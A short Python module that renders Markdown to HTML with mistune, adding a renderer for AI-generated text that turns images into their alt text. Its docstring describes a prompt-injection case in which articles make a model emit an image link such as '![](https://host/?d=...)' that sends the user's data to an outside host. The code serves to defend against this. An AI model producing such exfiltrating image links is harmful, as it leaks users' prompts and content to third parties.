"""Shared Markdown → HTML renderer (mistune)."""
import mistune as _mistune_module
from mistune.util import striptags as _striptags

_renderer = _mistune_module.create_markdown(escape=True)


class _NoImageRenderer(_mistune_module.HTMLRenderer):
    """HTML renderer that writes an image as its alt text.

    For model output. A model can be talked into anything by the articles it reads,
    and an image is the one thing in Markdown that loads by itself: the browser, or
    the mail client for a briefing, fetches it as soon as the text is shown. With
    img-src open to every host (article images need that), a prompt-injected
    ``![](https://host/?d=...)`` would carry whatever the model was given (other
    articles in a catch-up, the reader's own prompt) to that host, and even an
    innocent one is a tracking pixel. Nothing a summary or a chat answer says needs
    a picture.
    """

    def image(self, text: str, url: str, title: str | None = None) -> str:
        return _striptags(text)


_ai_renderer = _mistune_module.create_markdown(escape=True, renderer=_NoImageRenderer(escape=True))


def md_render(text: str) -> str:
    return _renderer(text)


def md_render_ai(text: str) -> str:
    """Render AI-generated Markdown: as ``md_render``, but images become their alt text."""
    return _ai_renderer(text)


def md_render_inline(text: str) -> str:
    """Render a single line of Markdown without the wrapping block <p>.

    For short prose (feature descriptions, labels) where a paragraph tag would
    add a block box. Falls back to the full render if the result isn't a single
    paragraph.
    """
    html = md_render(text).strip()
    if html.startswith("<p>") and html.endswith("</p>") and html.count("<p>") == 1:
        return html[3:-4]
    return html
